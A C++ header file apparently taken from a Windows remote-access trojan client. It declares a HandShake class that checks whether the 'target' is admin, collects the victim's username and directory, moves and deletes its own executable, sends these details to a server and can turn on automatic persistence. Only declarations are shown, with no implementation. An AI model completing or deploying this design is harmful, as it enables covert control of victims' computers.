#ifndef HANDSHAKE_H
#define HANDSHAKE_H
#include <iostream>
#include <windows.h>

using namespace  std;



class HandShake
{//Sends the primary information when the client connects.
//Collect the first information unavailable to the program
/*

1- Move the program.
2- Send the first information to the server.
*/
    public:
        HandShake();

        //It is method initializes when the constructor is called:
        bool setIsAdmin(); //look if admin or not and return false or true.
        string setNameUser(); // Return name user of target 
        string setCurrentDirectory(); // return current directory;
        string setLocationProg(); //set localisation prog after remove according to rights
        //string getPathProg(); //
        void setSock(int sock); //Set socket

        //---------------------------------------------------------------------
        //Network:
        //void sendUltraSafe(string data, int sock);  
        string recvUltraSafe();  //Ensures that data is not corrupted and handles errors.
        void sendUltraSafe(string data);
        int startHandShake(); //Sends the first necessary information to the server and if MOD_HANDSHAKE_AUTO_PERSISTENCE = True then persistence is activated automatically. 

        //---------------------------------------------------------------------
        //getter:
        bool getIsAdmin();//getter of is_admin
        string getPathProg();// getter see location of prog.
        string getNameUser();

        //---------------------------------------------------------------------
        void moveProg(); //First step after connection.

    private:
        bool a_is_admin=false;// check if target is admin or not.
        string a_name_prog;
        //string a_time; //Time to run program
        // string a_date;
        // string a_key; // key for cipher.
        string a_name_user; //https://stackoverflow.com/questions/11587426/get-current-username-in-c-on-windows
        string a_current_directory; //Location of programme execute.
        string a_location_prog; //Location of the program once moved and deleted


        timeval a_timeout;
    
        int a_sock;
};

#endif